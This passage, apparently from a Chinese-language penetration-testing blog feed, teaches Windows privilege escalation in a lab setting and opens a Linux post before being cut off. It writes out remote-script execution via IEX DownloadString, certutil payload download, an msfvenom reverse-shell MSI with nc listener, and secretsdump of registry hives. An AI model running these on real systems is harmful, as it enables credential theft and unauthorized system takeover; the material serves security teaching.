class="number">16.0</span>.<span class="number">15330.20264</span>  C:\Program Files (x86)\Microsoft Office</span><br><span class="line">mRemoteNG                                           <span class="number">1.62</span>              C:\Program Files\mRemoteNG</span><br><span class="line">TeamViewer                                          <span class="number">15.31</span>.<span class="number">5</span>           C:\Program Files\TeamViewer</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><h2 id="Clipboard"><a href="#Clipboard" class="headerlink" title="Clipboard"></a>Clipboard</h2><p>网络管理员使用密码管理器来存储他们的凭证并将密码复制并粘贴到登录表单中。由于这不涉及<code>typing</code>密码，因此击键记录在这种情况下无效。<code>clipboard</code>提供了对大量信息的访问，例如粘贴凭证和 2FA 软令牌，以及直接与 RDP 会话剪贴板交互的可能性。</p><p>使用<a href="https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1">Invoke-Clipboard</a>脚本来提取用户剪贴板数据。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-ClipboardLogger</span></span><br></pre></td></tr></table></figure><p>Invoke-ClipboardLogger 从剪贴板捕获凭据，该脚本将开始监视剪贴板中的条目并将其显示在 PowerShell 会话中。需要耐心等待，直到捕获敏感信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-ClipboardLogger</span></span><br><span class="line"></span><br><span class="line">https://portal.azure.com</span><br><span class="line"></span><br><span class="line">Administrator@something.com</span><br><span class="line"></span><br><span class="line">Sup9rC0mpl2xPa<span class="variable">$</span><span class="variable">$ws0921lk</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong>可以使用 Mimikatz 或键盘记录器等工具获取用户凭据。Metasploit 等 C2 框架包含用于键盘记录的内置功能。</p></blockquote><h2 id="Backup-Servers"><a href="#Backup-Servers" class="headerlink" title="Backup Servers"></a>Backup Servers</h2><p>备份可用于在数据删除或损坏导致丢失后恢复数据，或恢复较早时间的数据。备份提供了一种简单的灾难恢复形式。某些备份系统可以重建计算机系统或其他复杂配置，例如 Active Directory 服务器或数据库服务器。</p><p>通常，备份系统需要一个帐户来连接到目标计算机并执行备份。大多数公司要求备份帐户在目标计算机上具有本地管理权限，以访问其所有文件和服务。</p><hr><h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="Living-Off-The-Land-Binaries-and-Scripts-LOLBAS"><a href="#Living-Off-The-Land-Binaries-and-Scripts-LOLBAS" class="headerlink" title="Living Off The Land Binaries and Scripts (LOLBAS)"></a>Living Off The Land Binaries and Scripts (LOLBAS)</h2><p> <a href="https://lolbas-project.github.io/">LOLBAS</a>记录了可用于 Windows 系统上的“自谋生路”技术的二进制文件、脚本和库。这些二进制文件、脚本和库都是 Microsoft 签名的文件，它们要么是操作系统的原生文件，要么可以直接从 Microsoft 下载，并且具有对攻击者有用的意外功能。一些有趣的功能可能包括：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>代码执行</td><td>代码编译</td><td>文件传输</td></tr><tr><td>持久性</td><td>绕过UAC</td><td>凭证盗窃</td></tr><tr><td>转储进程内存</td><td>键盘记录</td><td>逃避</td></tr><tr><td>DLL 劫持</td><td></td><td></td></tr></tbody></table><h3 id="Certutil-传输文件"><a href="#Certutil-传输文件" class="headerlink" title="Certutil 传输文件"></a>Certutil 传输文件</h3><p><a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">certutil.exe</a> 下载文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">10.10</span>.<span class="number">14.3</span>:<span class="number">8080</span>/shell.bat shell.bat</span><br></pre></td></tr></table></figure><p>Base64 编码&#x2F;解码 传输</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">certutil</span> -<span class="title">encode</span> <span class="title">file1</span> <span class="title">encodedfile</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">certutil</span> -<span class="title">decode</span> <span class="title">encodedfile</span> <span class="title">file2</span></span></span><br></pre></td></tr></table></figure><h2 id="Always-install-with-elevated-privileges"><a href="#Always-install-with-elevated-privileges" class="headerlink" title="Always install with elevated privileges"></a>Always install with elevated privileges</h2><p>可以通过本地组策略在以下路径下进行设置<code>Always install with elevated privileges</code>来设置为<code>Enabled</code>。</p><ul><li><code>Computer Configuration\Administrative Templates\Windows Components\Windows Installer</code></li><li><code>User Configuration\Administrative Templates\Windows Components\Windows Installer</code></li></ul><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336909055.png" alt="alwaysinstall"></p><p>枚举此设置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    <span class="number">0</span>x1</span><br></pre></td></tr></table></figure><p>生成恶意文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi &gt; aie.msi</span><br></pre></td></tr></table></figure><p>上传到目标机器，并执行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">msiexec</span> /<span class="title">i</span> <span class="title">c</span>:\<span class="title">users</span>\<span class="title">htb</span>-<span class="title">student</span>\<span class="title">desktop</span>\<span class="title">aie.msi</span> /<span class="title">quiet</span> /<span class="title">qn</span> /<span class="title">norestart</span></span></span><br></pre></td></tr></table></figure><p>攻击机监听，NT AUTHORITY\SYSTEM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 9443</span><br></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>默认情况下，只能看到由用户创建的任务和每个 Windows 操作系统都有的默认计划任务。遗憾的是，无法列出其他用户（如管理员）创建的计划任务，因为它们存储在中<code>C:\Windows\System32\Tasks</code>，标准用户没有读取权限。可能会遇到以管理员身份运行的计划任务，其由于多种原因配置了弱的文件&#x2F;文件夹权限。在这种情况下，可以编辑任务本身以执行意外操作或修改计划任务运行的脚本。</p><p>枚举计划任务 schtasks</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;  <span class="title">schtasks</span> /<span class="title">query</span> /<span class="title">fo</span> <span class="title">LIST</span> /<span class="title">v</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \</span></span><br><span class="line"><span class="function"><span class="title">INFO</span>: <span class="title">There</span> <span class="title">are</span> <span class="title">no</span> <span class="title">scheduled</span> <span class="title">tasks</span> <span class="title">presently</span> <span class="title">available</span> <span class="title">at</span> <span class="title">your</span> <span class="title">access</span> <span class="title">level</span>.</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \<span class="title">Microsoft</span></span></span><br><span class="line"><span class="function"><span class="title">INFO</span>: <span class="title">There</span> <span class="title">are</span> <span class="title">no</span> <span class="title">scheduled</span> <span class="title">tasks</span> <span class="title">presently</span> <span class="title">available</span> <span class="title">at</span> <span class="title">your</span> <span class="title">access</span> <span class="title">level</span>.</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \<span class="title">Microsoft</span>\<span class="title">Windows</span></span></span><br><span class="line"><span class="function"><span class="title">INFO</span>: <span class="title">There</span> <span class="title">are</span> <span class="title">no</span> <span class="title">scheduled</span> <span class="title">tasks</span> <span class="title">presently</span> <span class="title">available</span> <span class="title">at</span> <span class="title">your</span> <span class="title">access</span> <span class="title">level</span>.</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Folder</span>: \<span class="title">Microsoft</span>\<span class="title">Windows</span>\.<span class="title">NET</span> <span class="title">Framework</span></span></span><br><span class="line"><span class="function"><span class="title">HostName</span>:                             <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">TaskName</span>:                             \<span class="title">Microsoft</span>\<span class="title">Windows</span>\.<span class="title">NET</span> <span class="title">Framework</span>\.<span class="title">NET</span> <span class="title">Framework</span> <span class="title">NGEN</span> <span class="title">v4</span>.0.30319</span></span><br><span class="line"><span class="function"><span class="title">Next</span> <span class="title">Run</span> <span class="title">Time</span>:                        <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Status</span>:                               <span class="title">Ready</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Mode</span>:                           <span class="title">Interactive</span>/<span class="title">Background</span></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">Run</span> <span class="title">Time</span>:                        5/27/2021 12:23:27 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">Result</span>:                          0</span></span><br><span class="line"><span class="function"><span class="title">Author</span>:                               <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Task</span> <span class="title">To</span> <span class="title">Run</span>:                          <span class="title">COM</span> <span class="title">handler</span></span></span><br><span class="line"><span class="function"><span class="title">Start</span> <span class="title">In</span>:                             <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>:                              <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Scheduled</span> <span class="title">Task</span> <span class="title">State</span>:                 <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">Idle</span> <span class="title">Time</span>:                            <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">Power</span> <span class="title">Management</span>:                     <span class="title">Stop</span> <span class="title">On</span> <span class="title">Battery</span> <span class="title">Mode</span>, <span class="title">No</span> <span class="title">Start</span> <span class="title">On</span> <span class="title">Batteries</span></span></span><br><span class="line"><span class="function"><span class="title">Run</span> <span class="title">As</span> <span class="title">User</span>:                          <span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function"><span class="title">Delete</span> <span class="title">Task</span> <span class="title">If</span> <span class="title">Not</span> <span class="title">Rescheduled</span>:       <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">Stop</span> <span class="title">Task</span> <span class="title">If</span> <span class="title">Runs</span> <span class="title">X</span> <span class="title">Hours</span> <span class="title">and</span> <span class="title">X</span> <span class="title">Mins</span>: 02:00:00</span></span><br><span class="line"><span class="function"><span class="title">Schedule</span>:                             <span class="title">Scheduling</span> <span class="title">data</span> <span class="title">is</span> <span class="title">not</span> <span class="title">available</span> <span class="title">in</span> <span class="title">this</span> <span class="title">format</span>.</span></span><br><span class="line"><span class="function"><span class="title">Schedule</span> <span class="title">Type</span>:                        <span class="title">On</span> <span class="title">demand</span> <span class="title">only</span></span></span><br><span class="line"><span class="function"><span class="title">Start</span> <span class="title">Time</span>:                           <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Start</span> <span class="title">Date</span>:                           <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">End</span> <span class="title">Date</span>:                             <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Days</span>:                                 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Months</span>:                               <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Every</span>:                        <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Until</span>: <span class="title">Time</span>:                  <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Until</span>: <span class="title">Duration</span>:              <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">Repeat</span>: <span class="title">Stop</span> <span class="title">If</span> <span class="title">Still</span> <span class="title">Running</span>:        <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure><p>枚举计划任务 Powershell Get-ScheduledTask</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ScheduledTask</span> | <span class="built_in">select</span> TaskName,State</span><br><span class="line"> </span><br><span class="line">TaskName                                                State</span><br><span class="line"><span class="literal">--------</span>                                                <span class="literal">-----</span></span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span>                          Ready</span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span> <span class="number">64</span>                       Ready</span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span> <span class="number">64</span> Critical           Disabled</span><br><span class="line">.NET Framework NGEN v4.<span class="number">0.30319</span> Critical              Disabled</span><br><span class="line">AD RMS Rights Policy Template Management (Automated) Disabled</span><br><span class="line">AD RMS Rights Policy Template Management (Manual)       Ready</span><br><span class="line">PolicyConverter                                      Disabled</span><br><span class="line">SmartScreenSpecific                                     Ready</span><br><span class="line">VerifiedPublisherCertStoreCheck                      Disabled</span><br><span class="line">Microsoft Compatibility Appraiser                       Ready</span><br><span class="line">ProgramDataUpdater                                      Ready</span><br><span class="line">StartupAppTask                                          Ready</span><br><span class="line">appuriverifierdaily                                     Ready</span><br><span class="line">appuriverifierinstall                                   Ready</span><br><span class="line">CleanupTemporaryState                                   Ready</span><br><span class="line">DsSvcCleanup                                            Ready</span><br><span class="line">Pre<span class="literal">-staged</span> app cleanup                               Disabled</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="用户-计算机描述字段"><a href="#用户-计算机描述字段" class="headerlink" title="用户&#x2F;计算机描述字段"></a>用户&#x2F;计算机描述字段</h2><p>系统管理员可以将帐户详细信息（例如密码）存储在计算机或用户的帐户描述字段中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-LocalUser</span><br><span class="line"> </span><br><span class="line">Name            Enabled Description</span><br><span class="line">----            ------- -----------</span><br><span class="line">Administrator   True    Built-in account for administering the computer/domain</span><br><span class="line">DefaultAccount  False   A user account managed by the system.</span><br><span class="line">Guest           False   Built-in account for guest access to the computer/domain</span><br><span class="line">helpdesk        True</span><br><span class="line">htb-student     True</span><br><span class="line">htb-student_adm True</span><br><span class="line">jordan          True</span><br><span class="line">logger          True</span><br><span class="line">sarah           True</span><br><span class="line">sccm_svc        True</span><br><span class="line">secsvc          True    Network scanner - do not change password</span><br><span class="line">sql_dev         True</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-WmiObject -Class Win32_OperatingSystem | select Description</span><br><span class="line"> </span><br><span class="line">Description</span><br><span class="line">-----------</span><br><span class="line">The most vulnerable box ever!</span><br></pre></td></tr></table></figure><h2 id="挂载-VHDX-VMDK"><a href="#挂载-VHDX-VMDK" class="headerlink" title="挂载 VHDX&#x2F;VMDK"></a>挂载 VHDX&#x2F;VMDK</h2><p><code>.vhd</code>、<code>.vhdx</code>、<code>.vmdk</code>文件是<code>Virtual Hard Disk</code>、<code>Virtual Hard Disk v2</code>（均由 Hyper-V 使用）和<code>Virtual Machine Disk</code>（由 VMware 使用）。</p><p>挂载 VMDK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk</span><br></pre></td></tr></table></figure><p>安装 VHD&#x2F;VHDX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1</span><br></pre></td></tr></table></figure><p>在 Windows 中，可以右键单击文件并选择<code>Mount</code>，或者使用<code>Disk Management</code>实用程序挂载<code>.vhd</code>或<code>.vhdx</code>文。或者使用<a href="https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps">Mount-VHD</a> PowerShell cmdlet。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336313775.png" alt="mount"></p><p>对于 <code>.vmdk</code> 文件，可以右键单击并从菜单中选择 <code>Map Virtual Disk</code>。接下来，系统将提示选择驱动器号。如果一切顺利，可以浏览目标操作系统的文件和目录。如果失败，可以使用 VMWare Workstation <code>File</code> –&gt; <code>Map Virtual Disks</code>映射到基础系统上。还可以将 <code>.vmdk</code> 文件作为附加虚拟硬盘添加到攻击 VM 上，然后将其作为带字母的驱动器进行访问。甚至可以使用 <code>7-Zip</code> 从 .vmdk 文件中提取数据。<a href="https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/">guide</a>介绍了多种访问 <code>.vmdk</code> 文件上的文件的方法。</p><p>如果可以找到实时机器的备份，可以访问 C:\Windows\System32\Config 目录并下拉 SAM、SECURITY 和 SYSTEM 注册表配置单元。然后，可以使用 secretsdump 之类的工具来提取本地用户的密码哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure><hr><h1 id="Legacy-Operating-Systems"><a href="#Legacy-Operating-Systems" class="headerlink" title="Legacy Operating Systems"></a>Legacy Operating Systems</h1><h2 id="End-of-Life-Systems-EOL"><a href="#End-of-Life-Systems-EOL" class="headerlink" title="End of Life Systems (EOL)"></a>End of Life Systems (EOL)</h2><p>随着时间的推移，微软决定不再为特定操作系统版本提供持续支持。当他们停止支持某个版本的 Windows 时，他们会停止为相关版本发布安全更新。Windows 系统首先进入“扩展支持”期，然后被归类为终止使用或不再受官方支持。微软继续通过定制的长期支持合同为这些系统创建安全更新，并提供给大型组织。以下是流行的 Windows 版本及其终止使用日期的列表：</p><h3 id="Windows-Desktop"><a href="#Windows-Desktop" class="headerlink" title="Windows Desktop"></a>Windows Desktop</h3><table><thead><tr><th>版本</th><th>日期</th></tr></thead><tbody><tr><td>Windows XP</td><td>2014 年 4 月 8 日</td></tr><tr><td>Windows Vista</td><td>2017 年 4 月 11 日</td></tr><tr><td>Windows 7</td><td>2020 年 1 月 14 日</td></tr><tr><td>Windows 8</td><td>2016 年 1 月 12 日</td></tr><tr><td>Windows 8.1</td><td>2023 年 1 月 10 日</td></tr><tr><td>Windows 10 version 1507</td><td>2017 年 5 月 9 日</td></tr><tr><td>Windows 10 version 1703</td><td>2018 年 10 月 9 日</td></tr><tr><td>Windows 10 version 1809</td><td>2020 年 11 月 10 日</td></tr><tr><td>Windows 10 version本 1903</td><td>2020 年 12 月 8 日</td></tr><tr><td>Windows 10 version 1909</td><td>2021 年 5 月 11 日</td></tr><tr><td>Windows 10 version 2004</td><td>2021 年 12 月 14 日</td></tr><tr><td>Windows 10 version 20H2</td><td>2022 年 5 月 10 日</td></tr></tbody></table><h3 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h3><table><thead><tr><th>版本</th><th>日期</th></tr></thead><tbody><tr><td>Windows Server 2003</td><td>2014 年 4 月 8 日</td></tr><tr><td>Windows Server 2003 R2</td><td>2015 年 7 月 14 日</td></tr><tr><td>Windows Server 2008</td><td>2020 年 1 月 14 日</td></tr><tr><td>Windows Server 2008 R2</td><td>2020 年 1 月 14 日</td></tr><tr><td>Windows Server 2012</td><td>2023 年 10 月 10 日</td></tr><tr><td>Windows Server 2012 R2</td><td>2023 年 10 月 10 日</td></tr><tr><td>Windows Server 2016</td><td>2027 年 1 月 12 日</td></tr><tr><td>Windows Server 2019</td><td>2029 年 1 月 9 日</td></tr></tbody></table><p><a href="https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/">End of Life Systems</a>更详细地列出了 Microsoft Windows 和其他产品（如 Exchange、SQL Server和 Microsoft Office）的终止日期，在评估期间可能会遇到所有这些产品。</p><h2 id="Differences"><a href="#Differences" class="headerlink" title="Differences"></a>Differences</h2><h3 id="Windows-Server-1"><a href="#Windows-Server-1" class="headerlink" title="Windows Server"></a>Windows Server</h3><p>Windows Server 2008&#x2F;2008 R2 已于 2020 年 1 月 14 日停产。多年来，微软为后续版本的 Windows Server 添加了增强的安全功能。在外部渗透测试中遇到 Server 2008 并不常见，但我在内部评估中经常遇到它。</p><p>下表显示了 Server 2008 与最新 Windows Server 版本之间的一些显著差异。</p><table><thead><tr><th>特征</th><th>服务器 2008 R2</th><th>服务器 2012 R2</th><th>服务器 2016</th><th>服务器 2019</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection">增强的 Windows Defender 高级威胁防护 (ATP)</a></td><td></td><td></td><td></td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">管理适度</a></td><td>部分的</td><td>部分的</td><td>十</td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">凭证保护</a></td><td></td><td></td><td>十</td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">远程凭证保护</a></td><td></td><td></td><td>十</td><td>十</td></tr><tr><td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">设备保护（代码完整性）</a></td><td></td><td></td><td>十</td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td><td>部分的</td><td>十</td><td>十</td><td>十</td></tr><tr><td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td><td>部分的</td><td>部分的</td><td>十</td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">控制流防护</a></td><td></td><td></td><td>十</td><td>十</td></tr></tbody></table><h3 id="Windows-Desktop-Versions"><a href="#Windows-Desktop-Versions" class="headerlink" title="Windows Desktop Versions"></a>Windows Desktop Versions</h3><p>Windows 7 已于 2020 年 1 月 14 日终止使用，但仍在许多环境中使用。</p><p>多年来，微软在 Windows 桌面的后续版本中增加了增强的安全功能。下表显示了 Windows 7 和 Windows 10 之间的一些显著差异。</p><table><thead><tr><th>特征</th><th>Windows 7</th><th>Windows 10</th></tr></thead><tbody><tr><td><a href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/">Microsoft 密码 (MFA)</a></td><td></td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview">BitLocker</a></td><td>部分的</td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">凭证保护</a></td><td></td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">远程凭证保护</a></td><td></td><td>十</td></tr><tr><td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">设备保护（代码完整性）</a></td><td></td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td><td>部分的</td><td>十</td></tr><tr><td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td><td>部分的</td><td>十</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">控制流防护</a></td><td></td><td>十</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Privesc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Privilege Escalation</title>
      <link href="/2024/10/25/pentest/privesc/Linux%20Privilege%20Escalation/"/>
      <url>/2024/10/25/pentest/privesc/Linux%20Privilege%20Escalation/</url>
      
        <content type="html"><![CDATA[<p>Linux 系统上的 root 帐户提供对操作系统的完全管理级别访问权限。在评估期间，可能会在 Linux 主机上获得低权限 shell，并需要将权限提升到 root 帐户。</p><h1 id="Environment-Enumeration"><a href="#Environment-Enumeration" class="headerlink" title="Environment Enumeration"></a>Environment Enumeration</h1><p>枚举是特权提升的关键。有多个辅助脚本（如<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>和<a href="https://github.com/rebootuser/LinEnum">LinEnum）</a>可用于协助枚举。</p><h2 id="Operating-system-and-version"><a href="#Operating-system-and-version" class="headerlink" title="Operating system and version"></a>Operating system and version</h2><p><a href="https://ubuntu.com/about/release-cycle">Ubuntu 维护周期</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/os-release</span><br><span class="line"></span><br><span class="line">NAME=&quot;Ubuntu&quot;</span><br><span class="line">VERSION=&quot;20.04.4 LTS (Focal Fossa)&quot;</span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=&quot;Ubuntu 20.04.4 LTS&quot;</span><br><span class="line">VERSION_ID=&quot;20.04&quot;</span><br><span 